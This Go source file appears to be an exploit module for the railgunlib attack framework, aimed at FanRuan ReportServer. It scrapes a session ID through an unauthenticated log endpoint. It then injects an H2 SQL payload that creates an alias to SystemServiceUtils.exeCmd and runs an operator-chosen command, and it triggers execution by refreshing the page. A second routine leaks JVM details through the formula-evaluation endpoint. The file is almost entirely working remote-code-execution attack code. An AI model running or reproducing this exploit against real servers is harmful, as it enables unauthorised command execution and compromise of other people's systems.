package exp_fanruan

import (
	"fmt"
	"github.com/lz520520/railgunlib/pkg/goutils"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"net/url"
	"regexp"
	"strings"
	"time"
)

type Exp_RCE1 struct {
	exp_templates.ExpTemplate
}

func (self *Exp_RCE1) Attack_cmd1() (expResult exp_model.ExpResult) {
	// 默认配置
	headers := self.GetInitExpHeaders()

	// 未授权访问查询界面，获取sessionID
	queryUrl := goutils.AppendUri(self.Params.BaseParam.Target, "/ReportServer?op=fr_log&cmd=fg_errinfo&fr_username=admin")
	httpresp := self.HttpGetWithoutRedirect(queryUrl, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	result := regexp.MustCompile(`op=fr_dialog&cmd=parameters_d&sessionID=(\d+)`).FindStringSubmatch(httpresp.Body)
	if len(result) == 0 {
		self.EchoErrMsg("无sessionID")
		return
	}
	sessionID := result[1]

	// payload发送
	payload := strings.ReplaceAll(`{"LABEL1":"TYPE:","TYPE":"10;CREATE ALIAS RUMCMD FOR \"com.fr.chart.phantom.system.SystemServiceUtils.exeCmd\";CALL RUMCMD('{{cmd}}');select msg, trace, sinfo, logtime from fr_errrecord where 1=1","LABEL3":"START_TIME:","START_TIME":"2022-04-24+00:00","LABEL5":"END_TIME:","END_TIME":"2022-04-24+16:00","LABEL7":"LIMIT:","LIMIT":1000}`, "{{cmd}}", self.MustGetStringParam("cmd"))
	payload = "__parameters__=" + url.QueryEscape(payload)

	httpresp = self.HttpPostWithoutRedirect(goutils.AppendUri(self.Params.BaseParam.Target, "/ReportServer?"+result[0]), payload, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.RawResult = httpresp.RawFullResp
	if httpresp.Resp.StatusCode != 200 {
		self.EchoErrMsg("执行失败")
		return
	}

	// 刷新执行
	refreshUrl := goutils.AppendUri(self.Params.BaseParam.Target, fmt.Sprintf("/ReportServer?_=%d&__boxModel__=true&op=page_content&sessionID=%s&pn=1", time.Now().UnixMilli(), sessionID))
	httpresp = self.HttpGetWithoutRedirect(refreshUrl, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	if httpresp.Resp.StatusCode != 200 {
		self.EchoErrMsg("刷新失败")
		return
	}

	self.EchoSuccessMsg("无回显，自行检查")
	return
}

func (self *Exp_RCE1) Attack_getmsg1() (expResult exp_model.ExpResult) {
	// 默认配置
	headers := self.GetInitExpHeaders()

	// 发送请求
	payload := `op=fr_base&cmd=evaluate_formula&expression=jvm()`
	httpresp := self.HttpPostWithoutRedirect(goutils.AppendUri(self.Params.BaseParam.Target, "/ReportServer"), payload, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.RawResult = httpresp.RawFullResp
	expResult.Result = strings.ReplaceAll(httpresp.Body, "\\n", "\r\n")
	return
}

func init() {
	exp_register.ExpStructRegister(&Exp_RCE1{}, "exp_RCE1.yml")

}
